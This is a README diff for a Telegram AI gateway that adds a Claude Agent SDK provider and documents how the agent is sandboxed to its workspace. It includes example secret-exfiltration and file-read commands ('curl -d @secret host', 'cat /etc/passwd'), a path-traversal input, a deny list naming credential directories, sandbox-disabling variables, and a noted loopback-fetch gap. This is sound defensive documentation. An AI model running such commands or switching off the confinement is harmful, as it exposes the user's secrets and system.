@@ -2,7 +2,8 @@
 
 A tiny, privacy-first AI gateway you talk to **only over Telegram**. One user,
 one chat, your choice of AI provider (Gemini, OpenAI, Anthropic, OpenRouter,
-or a local OpenAI-compatible model). The model gets a `SOUL.md` (its system
+the Claude Agent SDK on your Claude subscription, or a local
+OpenAI-compatible model). The model gets a `SOUL.md` (its system
 prompt, which it can rewrite), a sandboxed `workspace/` it can't escape, and a
 few tools defined in `tools.json` (which it can also edit). No Docker, no
 database, no web UI, zero external Go dependencies.
@@ -84,6 +85,9 @@ replies. Only your configured chat id is answered; everyone else is ignored.
 - `/agent new <name> [personality…]` — create a new agent and use it here
 - `/agent use <name>` (or just `/agent <name>`) — assign an agent to this chat/topic
 - `/agent delete <name>` — delete an agent and all of its files
+- `/claude` — switch to the Claude Agent SDK (uses your Claude subscription's
+  session usage, not an API key); `/claude status`, `/claude off`,
+  `/claude model <m>`, `/claude reset`
 - `/help` — list commands
 - anything else — sent to the model
 
@@ -228,6 +232,7 @@ Supported providers:
 | Anthropic     | `anthropic`      | `anthropic_api_key`, `anthropic_model` |
 | OpenRouter    | `openrouter`     | `openrouter_api_key`, `openrouter_model` |
 | Local         | `local`          | `local_model`, `local_base_url` (default Ollama `http://localhost:11434/v1`) |
+| Claude Agent SDK | `claude-sdk`  | **no API key** — your Claude subscription login, plus the sidecar (below) |
 
 `openai`, `openrouter`, and `local` all speak the OpenAI Chat Completions
 format, so the **local** option works with Ollama, LM Studio, llama.cpp's
@@ -248,6 +253,177 @@ You can also set any key at runtime, e.g. *"use set_config to set
 openai_api_key to sk-…"* — keys are stored `0600` and shown masked.
 
 ---
+=======
+## Claude Agent SDK (use your subscription instead of an API key)
+
+The `claude-sdk` provider is different from the rest: it doesn't call a metered
+API. It drives the **Claude Agent SDK** — the headless `claude` CLI — running
+under your own Claude login, so turns consume your subscription's **session
+usage** rather than API credits. The SDK also brings its own tools and its own
+agent loop, so under this provider Claude does the thinking and tool use itself
+and the gateway just relays the conversation.
+
+### Why there's a sidecar
+
+The gateway deliberately contains no `os/exec`, and under the hardened systemd
+unit it can't read your home directory — so it can neither spawn `claude` nor
+reach the OAuth credentials in `~/.claude`. A small host-level sidecar owns
+both, and the gateway talks to it over loopback, the same pattern
+`internal/coderelay` already uses for the code service.
+
+### Setup
+
+1. Log the CLI in once, with the account that holds the subscription:
+
+   ```sh
+   claude          # then /login
+   claude /status  # "Login method" should show your account, not an API key
+   ```
+
+   If `ANTHROPIC_API_KEY` is set in your environment it would normally override
+   the subscription and bill that key instead — the sidecar strips it from the
+   `claude` child process so this can't happen by accident.
+
+2. Start the sidecar (Node 18+, no npm dependencies). `make run` does this for
+   you — it launches the sidecar alongside the gateway and stops it again on
+   exit:
+
+   ```sh
+   make run                                 # gateway + sidecar together
+   ```
+
+   Or run the pieces separately:
+
+   ```sh
+   make sidecar                             # listens on 127.0.0.1:8081
+   make run-gateway                         # gateway only
+   ```
+
+   `make run` reuses a sidecar that's already listening rather than starting a
+   second one, and skips it entirely (with a warning) if `node` isn't
+   installed — every other provider works fine without it. Override the port
+   with `make run SIDECAR_PORT=9000`.
+
+   It must run as **your** user, not the `tg-agent` service user: it needs the
+   Claude login in your home directory. So the hardened `setup.sh` install
+   deliberately doesn't include it — supervise it with a user systemd unit
+   (`systemctl --user`, plus `loginctl enable-linger`) if you want it always on.
+
+3. Turn it on from Telegram:
+
+   ```
+   /claude              switch to it
+   /claude status       provider, model, sidecar, live sessions
+   /claude model opus   pick a model (alias or full id)
+   /claude off          go back to the previous provider
+   /claude reset        forget this conversation's SDK session
+   ```
+
+   Or at setup time, choose `claude-sdk` in the wizard.
+
+### What Claude can reach (sandboxing)
+
+Under this provider the SDK runs as **your** user, so by default it could touch
+anything you can. The sidecar confines it to the workspace directory the
+gateway hands it, in three layers:
+
+| Layer | What it does | Enforced by |
+|---|---|---|
+| No shell | `Bash`, `WebFetch`, `WebSearch` are denied outright | permission rules |
+| Path rules | Read/Write/Edit scoped to the workspace; `~/.ssh`, `~/.aws`, `~/.claude`, `/etc` denied | permission rules |
+| **OS sandbox** | filesystem **read-only** apart from the workspace | **the kernel** |
+
+The third layer is the one that actually holds, and it is worth being blunt
+about why. Permission rules **cannot** confine writes to a directory: scoped
+`Write(<ws>/**)` allow rules don't stop a write elsewhere, and the only rule
+that does — `Write(//**)` — matches every absolute path including the
+workspace's own, with deny beating allow and no carve-out. Tested against CLI
+2.1.179. So if `bwrap` is missing, an out-of-workspace write is *requested* not
+to happen, but not *prevented*; with it, the write fails with `EROFS` no matter
+what the model decides to try.
+
+The reasoning, and the measurements behind it, are recorded in
+[docs/adr/0001](docs/adr/0001-claude-sdk-provider-and-filesystem-confinement.md).
+
+The third layer uses a different mechanism per platform, picked automatically:
+
+| Platform | Backend | Install |
+|---|---|---|
+| Linux | bubblewrap (`bwrap`) | `pacman -S bubblewrap` / `apt install bubblewrap` |
+| macOS | `sandbox-exec` (Seatbelt) | built in |
+
+The sidecar says which one is active at startup, e.g.
+
+```
+sandbox: bubblewrap — filesystem read-only except the workspace (kernel-enforced)
+```
+
+**Check it on your machine** — especially on macOS, where this path is
+implemented but has not been executed by its author:
+
+```sh
+node sidecar/claude-sdk-service.js --selftest
+```
+
+It writes inside and outside a scratch workspace through the real sandbox and
+exits non-zero unless the outside write is blocked. Two macOS caveats:
+`sandbox-exec` has been marked deprecated for years while shipping in every
+release, and Seatbelt confines the filesystem but **not** Keychain (which is
+IPC, not a file).
+
+The shell is off rather than whitelisted because a shell cannot be confined to
+a directory by permission rules — `cat /etc/passwd` and
+`curl -d @secret host` walk straight past any `Read()` rule.
+
+Escape hatches, both deliberately explicit: `CLAUDE_NO_SANDBOX=1` drops the
+kernel layer, `CLAUDE_UNSAFE=1` drops the sandbox entirely and restores Bash.
+`CLAUDE_WORKSPACE_ROOT=/path` pins every run under one directory regardless of
+what the caller asks for.
+
+### Sessions
+
+The SDK keeps conversation history on its own side, under a session id. The
+gateway stores one session per **(agent, topic)** in
+`state/claude_sessions.json` and resumes it on every turn, so each Telegram
+topic keeps its own independent Claude conversation across restarts. `/new`
+clears the SDK session along with the local history, and if a session ever
+goes stale the next message quietly starts a fresh one.
+
+Environment knobs for the sidecar: `PORT`, `CLAUDE_BIN`, `CLAUDE_TIMEOUT_MS`,
+`CLAUDE_ALLOWED_TOOLS`.
+
+> The sidecar can spend your subscription, so it binds to loopback only, and
+> the gateway refuses any non-loopback sidecar URL.
+
+## What each provider can reach
+
+The two provider families are confined by completely different mechanisms, and
+neither inherits the other's protection:
+
+| | Gemini / OpenAI / Anthropic / OpenRouter / local | Claude Agent SDK (`claude-sdk`) |
+|---|---|---|
+| Runs where | inside the gateway process | in the sidecar's `claude` CLI |
+| Filesystem via | the gateway's own tools only | the SDK's own tools |
+| Confined to | that agent's `workspace/` | the workspace dir, read-only elsewhere |
+| Enforced by | `internal/workspace` (Go) | bubblewrap (kernel) |
+| Shell | none exists | denied |
+
+**The API providers never touch disk directly.** They can only emit tool calls,
+and every file tool resolves through `workspace.SafeWorkspace`. Traversal
+(`../../etc/passwd`) is rejected outright; an absolute path (`/etc/hostname`) is
+neutralised rather than rejected — `filepath.Join` treats it as relative, so it
+lands harmlessly nested at `<workspace>/etc/hostname` and nothing outside is
+touched. Both behaviours are covered by tests in `esc_probe_test.go`.
+
+Agents can't read each other either: each profile gets its own workspace root.
+
+One gap worth knowing: `web_fetch` rejects `file://` and non-HTTP schemes, but
+does **not** filter loopback, so a model can ask it for `http://127.0.0.1:<port>/…`
+and reach a local service. It's a read-only GET, low severity on a single-user
+box, but it is not currently blocked. See
+[docs/adr/0001](docs/adr/0001-claude-sdk-provider-and-filesystem-confinement.md).
+
+## What the model can do out of the box
 
 ## Deployment
 
